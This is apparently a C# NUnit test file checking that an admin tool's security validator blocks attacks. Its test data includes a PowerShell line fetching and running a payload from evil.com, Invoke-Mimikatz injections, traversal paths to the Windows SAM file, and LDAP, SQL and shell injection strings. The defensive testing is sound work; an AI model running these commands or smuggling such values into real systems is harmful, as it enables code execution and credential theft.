using System;
using System.IO;
using NUnit.Framework;
using NecessaryAdminTool.Security;

// TAG: #SECURITY_CRITICAL #INTEGRATION_TESTING #END_TO_END #VERSION_2_0
namespace NecessaryAdminTool.SecurityTests
{
    /// <summary>
    /// Integration tests for security-critical workflows
    /// Tests end-to-end attack prevention across multiple components
    /// TAG: #SECURITY_TESTING #ATTACK_PREVENTION #DEFENSE_IN_DEPTH
    /// </summary>
    [TestFixture]
    public class IntegrationTests
    {
        #region PowerShell Execution Integration Tests

        [TestFixture]
        public class PowerShellExecutionIntegrationTests
        {
            [Test]
            public void PowerShellExecution_MaliciousScript_Blocked()
            {
                // Simulate a PowerShell script execution workflow
                var maliciousScript = "Invoke-WebRequest http://evil.com/payload.ps1 | iex";

                // Validation should catch this before execution
                bool isValid = SecurityValidator.ValidatePowerShellScript(maliciousScript);
                Assert.IsFalse(isValid, "Malicious PowerShell script should be blocked");
            }

            [Test]
            public void PowerShellExecution_UserInputSanitization_RemovesInjection()
            {
                // User provides computer name with injection attempt
                var maliciousInput = "SERVER01; Invoke-Mimikatz";
                var sanitized = SecurityValidator.SanitizeForPowerShell(maliciousInput);

                // Semicolon should be removed
                Assert.IsFalse(sanitized.Contains(";"));

                // Build PowerShell command with sanitized input
                var command = $"Get-Process -ComputerName '{sanitized}'";

                // Command should be safe
                Assert.IsTrue(SecurityValidator.ValidatePowerShellScript(command));
            }

            [Test]
            public void PowerShellExecution_EncodedCommandDetection()
            {
                // Attacker tries to use encoded command to bypass detection
                var encodedAttack = "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==";

                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(encodedAttack));
            }

            [Test]
            public void PowerShellExecution_ObfuscationDetection()
            {
                // Heavily obfuscated script should be blocked
                var obfuscated = @"
                    $a = [char[]]('72','101','108','108','111');
                    $b = -join $a;
                    [Convert]::ToString($b);
                    ([char]73+[char]69+[char]88)
                ";

                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(obfuscated));
            }
        }

        #endregion

        #region File Operations Integration Tests

        [TestFixture]
        public class FileOperationsIntegrationTests
        {
            private string _tempDir;
            private string _restrictedDir;

            [SetUp]
            public void SetUp()
            {
                _tempDir = Path.Combine(Path.GetTempPath(), "SecurityTests_" + Guid.NewGuid());
                _restrictedDir = Path.Combine(Path.GetTempPath(), "Restricted_" + Guid.NewGuid());
                Directory.CreateDirectory(_tempDir);
                Directory.CreateDirectory(_restrictedDir);
            }

            [TearDown]
            public void TearDown()
            {
                if (Directory.Exists(_tempDir))
                    Directory.Delete(_tempDir, true);
                if (Directory.Exists(_restrictedDir))
                    Directory.Delete(_restrictedDir, true);
            }

            [Test]
            public void FileOperations_PathTraversalAttack_Blocked()
            {
                // User provides filename with path traversal
                var maliciousFilename = "..\\..\\..\\Windows\\System32\\config\\sam";

                // Filename validation should catch directory separators
                Assert.IsFalse(SecurityValidator.IsValidFilename(maliciousFilename));

                // Even if they try to combine with base path
                var attemptedPath = Path.Combine(_tempDir, maliciousFilename);
                Assert.IsFalse(SecurityValidator.IsValidFilePath(attemptedPath, _tempDir));
            }

            [Test]
            public void FileOperations_AbsolutePathEscape_Blocked()
            {
                // Attacker tries to use absolute path to access restricted file
                var absolutePath = Path.Combine(_restrictedDir, "sensitive.txt");

                // Should be blocked when base directory is _tempDir
                Assert.IsFalse(SecurityValidator.IsValidFilePath(absolutePath, _tempDir));
            }

            [Test]
            public void FileOperations_ValidFileWithinBase_Allowed()
            {
                // Valid operation within allowed directory
                var validFile = Path.Combine(_tempDir, "report.txt");
                Assert.IsTrue(SecurityValidator.IsValidFilePath(validFile, _tempDir));

                var validFilename = "report.txt";
                Assert.IsTrue(SecurityValidator.IsValidFilename(validFilename));
            }

            [Test]
            public void FileOperations_SubdirectoryWithinBase_Allowed()
            {
                // Create subdirectory
                var subDir = Path.Combine(_tempDir, "subfolder");
                Directory.CreateDirectory(subDir);

                var fileInSubdir = Path.Combine(subDir, "data.csv");
                Assert.IsTrue(SecurityValidator.IsValidFilePath(fileInSubdir, _tempDir));
            }

            [Test]
            public void FileOperations_InvalidFilenameChars_Blocked()
            {
                var invalidFilenames = new[]
                {
                    "file<script>.txt",
                    "data>output.csv",
                    "report:stream.txt",
                    "file|pipe.txt",
                    "query?.txt",
                    "wild*.txt"
                };

                foreach (var filename in invalidFilenames)
                {
                    Assert.IsFalse(SecurityValidator.IsValidFilename(filename),
                        $"Filename with invalid chars should be blocked: {filename}");
                }
            }
        }

        #endregion

        #region Active Directory Integration Tests

        [TestFixture]
        public class ActiveDirectoryIntegrationTests
        {
            [Test]
            public void ADQuery_LDAPInjectionInSearchFilter_Blocked()
            {
                // User searches for username with LDAP injection
                var maliciousInput = "*)(objectClass=*)";

                // First level: input sanitization
                var sanitized = SecurityValidator.EscapeLDAPSearchFilter(maliciousInput);
                Assert.AreEqual("\\2a\\29\\28objectClass=\\2a\\29", sanitized);

                // Second level: filter validation
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(maliciousInput));
            }

            [Test]
            public void ADQuery_ORInjectionAttempt_Blocked()
            {
                var orInjection = "*)(|(uid=*)";
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(orInjection));
            }

            [Test]
            public void ADQuery_ValidFilter_Allowed()
            {
                var validFilter = "(cn=John Doe)";
                Assert.IsTrue(SecurityValidator.ValidateLDAPFilter(validFilter));
            }

            [Test]
            public void ADQuery_OUFilterInjection_Blocked()
            {
                // Attacker tries to inject into OU filter
                var maliciousOU = "OU=Users)(objectClass=*)";
                Assert.IsFalse(SecurityValidator.ValidateOUFilter(maliciousOU));
            }

            [Test]
            public void ADQuery_ValidOUFilter_Allowed()
            {
                var validOU = "OU=Users,OU=IT,DC=corp,DC=local";
                Assert.IsTrue(SecurityValidator.ValidateOUFilter(validOU));
            }

            [Test]
            public void ADQuery_UsernameValidation_BlocksInjection()
            {
                var maliciousUsernames = new[]
                {
                    "admin;whoami",
                    "user|malicious",
                    "admin'--",
                    "user*enumeration"
                };

                foreach (var username in maliciousUsernames)
                {
                    Assert.IsFalse(SecurityValidator.ValidateUsername(username),
                        $"Malicious username should be blocked: {username}");
                }
            }
        }

        #endregion

        #region Authentication Integration Tests

        [TestFixture]
        public class AuthenticationIntegrationTests
        {
            [Test]
            public void Authentication_BruteForceAttempt_RateLimited()
            {
                var username = "bruteforce_test_" + Guid.NewGuid();

                // Simulate 5 failed login attempts (allowed)
                for (int i = 0; i < 5; i++)
                {
                    bool allowed = SecurityValidator.CheckRateLimit(username);
                    Assert.IsTrue(allowed, $"Attempt {i + 1} should be allowed");
                }

                // 6th attempt should be blocked
                bool sixthAttempt = SecurityValidator.CheckRateLimit(username);
                Assert.IsFalse(sixthAttempt, "Brute force attack should be rate limited after 5 attempts");
            }

            [Test]
            public void Authentication_SuccessfulLogin_ResetsRateLimit()
            {
                var username = "success_test_" + Guid.NewGuid();

                // Use up attempts
                for (int i = 0; i < 5; i++)
                {
                    SecurityValidator.CheckRateLimit(username);
                }

                // Should be blocked
                Assert.IsFalse(SecurityValidator.CheckRateLimit(username));

                // Simulate successful login
                SecurityValidator.ResetRateLimit(username);

                // Should be allowed again
                Assert.IsTrue(SecurityValidator.CheckRateLimit(username));
            }

            [Test]
            public void Authentication_UsernameInjection_Blocked()
            {
                var injectionAttempts = new[]
                {
                    "admin' OR '1'='1",
                    "user; DROP TABLE users--",
                    "admin<script>alert(1)</script>",
                    "user|whoami"
                };

                foreach (var username in injectionAttempts)
                {
                    Assert.IsFalse(SecurityValidator.ValidateUsername(username),
                        $"Username injection should be blocked: {username}");
                }
            }
        }

        #endregion

        #region Remote Command Integration Tests

        [TestFixture]
        public class RemoteCommandIntegrationTests
        {
            [Test]
            public void RemoteCommand_ComputerNameInjection_Blocked()
            {
                var maliciousNames = new[]
                {
                    "SERVER01;whoami",
                    "PC|malicious",
                    "WKS&cmd.exe",
                    "DESK$variable",
                    "HOST`invoke-expression"
                };

                foreach (var name in maliciousNames)
                {
                    Assert.IsFalse(SecurityValidator.IsValidComputerName(name),
                        $"Computer name injection should be blocked: {name}");
                }
            }

            [Test]
            public void RemoteCommand_ValidComputerName_Allowed()
            {
                var validNames = new[]
                {
                    "SERVER01",
                    "DESKTOP-ABC123",
                    "WKS-IT-001"
                };

                foreach (var name in validNames)
                {
                    Assert.IsTrue(SecurityValidator.IsValidComputerName(name),
                        $"Valid computer name should be allowed: {name}");
                }
            }

            [Test]
            public void RemoteCommand_IPAddressInjection_Blocked()
            {
                var maliciousIPs = new[]
                {
                    "192.168.1.1; whoami",
                    "10.0.0.1 | nc",
                    "172.16.0.1 & malicious"
                };

                foreach (var ip in maliciousIPs)
                {
                    Assert.IsFalse(SecurityValidator.IsValidIPAddress(ip),
                        $"IP address injection should be blocked: {ip}");
                }
            }

            [Test]
            public void RemoteCommand_HostnameInjection_Blocked()
            {
                var maliciousHosts = new[]
                {
                    "server.com;whoami",
                    "web.local|malicious",
                    "db.corp&cmd"
                };

                foreach (var host in maliciousHosts)
                {
                    Assert.IsFalse(SecurityValidator.IsValidHostname(host),
                        $"Hostname injection should be blocked: {host}");
                }
            }
        }

        #endregion

        #region Multi-Layer Defense Tests

        [TestFixture]
        public class MultiLayerDefenseTests
        {
            [Test]
            public void MultiLayer_PowerShellWithUserInput_BothLayersProtect()
            {
                // Malicious user input
                var userInput = "test; Invoke-Mimikatz";

                // Layer 1: Input sanitization
                var sanitized = SecurityValidator.SanitizeForPowerShell(userInput);
                Assert.IsFalse(sanitized.Contains(";"));

                // Layer 2: Script validation (if attacker bypassed layer 1)
                var maliciousScript = "Invoke-Mimikatz";
                Assert.IsFalse(SecurityValidator.ValidatePowerShellScript(maliciousScript));
            }

            [Test]
            public void MultiLayer_LDAPWithUserInput_BothLayersProtect()
            {
                // Malicious user input
                var userInput = "*)(objectClass=*)";

                // Layer 1: LDAP escaping
                var escaped = SecurityValidator.EscapeLDAPSearchFilter(userInput);
                Assert.AreEqual("\\2a\\29\\28objectClass=\\2a\\29", escaped);

                // Layer 2: Filter validation (if attacker bypassed layer 1)
                Assert.IsFalse(SecurityValidator.ValidateLDAPFilter(userInput));
            }

            [Test]
            public void MultiLayer_FilePathWithUserInput_BothLayersProtect()
            {
                var tempDir = Path.GetTempPath();

                // Malicious filename
                var maliciousFilename = "..\\..\\Windows\\System32\\config\\sam";

                // Layer 1: Filename validation
                Assert.IsFalse(SecurityValidator.IsValidFilename(maliciousFilename));

                // Layer 2: Path validation (if attacker bypassed layer 1)
                var attemptedPath = Path.Combine(tempDir, maliciousFilename);
                Assert.IsFalse(SecurityValidator.IsValidFilePath(attemptedPath, tempDir));
            }

            [Test]
            public void MultiLayer_RateLimitingPreventsAutomatedAttacks()
            {
                var username = "automated_attack_" + Guid.NewGuid();

                // Simulate automated brute force (rapid attempts)
                int allowedAttempts = 0;
                int blockedAttempts = 0;

                for (int i = 0; i < 10; i++)
                {
                    if (SecurityValidator.CheckRateLimit(username))
                        allowedAttempts++;
                    else
                        blockedAttempts++;
                }

                Assert.LessOrEqual(allowedAttempts, 5, "Should allow maximum 5 attempts");
                Assert.GreaterOrEqual(blockedAttempts, 5, "Should block attempts after limit");
            }
        }

        #endregion

        #region Cross-Component Security Tests

        [TestFixture]
        public class CrossComponentSecurityTests
        {
            [Test]
            public void CrossComponent_AllInputsValidatedBeforeUse()
            {
                // Comprehensive workflow test
                var computerName = "SERVER01";
                var username = "DOMAIN\\admin";
                var scriptContent = "Get-Service";
                var fileName = "output.txt";
                var ipAddress = "192.168.1.10";

                // All validations should pass for legitimate inputs
                Assert.IsTrue(SecurityValidator.IsValidComputerName(computerName));
                Assert.IsTrue(SecurityValidator.ValidateUsername(username));
                Assert.IsTrue(SecurityValidator.ValidatePowerShellScript(scriptContent));
                Assert.IsTrue(SecurityValidator.IsValidFilename(fileName));
                Assert.IsTrue(SecurityValidator.IsValidIPAddress(ipAddress));
            }

            [Test]
            public void CrossComponent_AnyInvalidInputBlocksWorkflow()
            {
                // One invalid input should stop the entire workflow
                var computerName = "SERVER01;whoami"; // INVALID
                var username = "DOMAIN\\admin";
                var scriptContent = "Get-Service";

                // Workflow should be blocked by computer name validation
                if (!SecurityValidator.IsValidComputerName(computerName))
                {
                    // Workflow stops here - success!
                    Assert.Pass("Workflow correctly blocked by invalid computer name");
                    return;
                }

                Assert.Fail("Invalid computer name should have blocked the workflow");
            }

            [Test]
            public void CrossComponent_ChainedValidations_AllEnforced()
            {
                var tempDir = Path.GetTempPath();

                // Test chained validations
                var filename = "report.txt"; // Valid filename
                var fullPath = Path.Combine(tempDir, filename); // Valid path
                var computerName = "SERVER01"; // Valid computer

                Assert.IsTrue(SecurityValidator.IsValidFilename(filename), "Filename should be valid");
                Assert.IsTrue(SecurityValidator.IsValidFilePath(fullPath, tempDir), "Path should be valid");
                Assert.IsTrue(SecurityValidator.IsValidComputerName(computerName), "Computer name should be valid");

                // Now test with one invalid link in the chain
                var maliciousFilename = "..\\..\\sensitive.txt";
                Assert.IsFalse(SecurityValidator.IsValidFilename(maliciousFilename), "Malicious filename should break the chain");
            }
        }

        #endregion
    }
}
